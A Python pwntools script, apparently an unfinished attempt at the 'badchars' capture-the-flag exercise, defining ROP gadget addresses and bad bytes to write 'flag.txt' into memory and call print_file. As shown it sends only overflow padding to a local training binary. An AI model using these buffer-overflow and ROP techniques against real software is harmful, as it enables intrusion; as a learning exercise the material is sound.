from pwn import *
import time

# Bad Bytes: | 78 | 67 | 61 | 2e |
class Gadgets(object):
    """
    :param
        - pop_rdi
            + RDI acts as ARG3 in the print_file function so we need to control that because that acts as the filename
            + with pop_rdi we can pop it off the stack and then feed bytes into it
    :param
        - xor_rdi
            + XORS the bytes inside of RDI
            + this is to bypass the possible bad bytes of 'flag.txt' because we know that 'a' and '.' are bad bytes
    :param
        - pop_r13_r14_r15
            + pops r13 & r14 & r15 off the stack so we can give inputs to them
            + we will use this to write to the .data segment
    :param
        - xor_r15_r14
            + XORS the bytes in r15 against the bytes into r14
            + used for avoiding any possible bad bytes
    :param
        - mov_r13_r12
            + we will use this to write bytes into memory
    """
    pop_rdi = p64(0x00000000004006a3)  # pop rdi ; ret
    xor_rdi = p64(0x0000000000400629)  # 0x0000000000400629: xor byte ptr [rdi], dh; ret;

    pop_r13_r14_r15 = p64(0x000000000040069e)  # 0x000000000040069e: pop r13; pop r14; pop r15; ret;
    xor_r15_r14 = p64(0x0000000000400628)  # 0x0000000000400628: xor byte ptr [r15], r14b; ret;

    mov_r13_r12 = p64(0x0000000000400634)  # 0x0000000000400634: mov qword ptr [r13], r12; ret;

results = []
rop_payload = []
def write_primitive():
    print_file = p64(0x0000000000400510)  # location in memory where print_file() exist
    data_addr = p64(0x00601028)  # location of .data section in memory
    rop_chain = b"\x41" * 40

    # load binary & send payload then receive response
    p = process(["./badchars"])
    p.recvuntil("> ")
    p.sendline(rop_chain)

    # details will be stored in 'results' & 'rop_payload'
    results.append(p.recvall().decode("utf-8"))
    rop_payload.append(rop_chain)

def verbosity(payload):
    print("[( + )] Hexdumping Payload, Please Wait..." + "\n")
    time.sleep(2)
    print(hexdump(rop_payload, skip=False) + "\n")

    print("[( + )] Printing Results, Please Wait..." + "\n")
    time.sleep(2)
    print("".join(results) + "\n")

if __name__ == "__main__":
    write_primitive()
    verbosity(payload=rop_payload)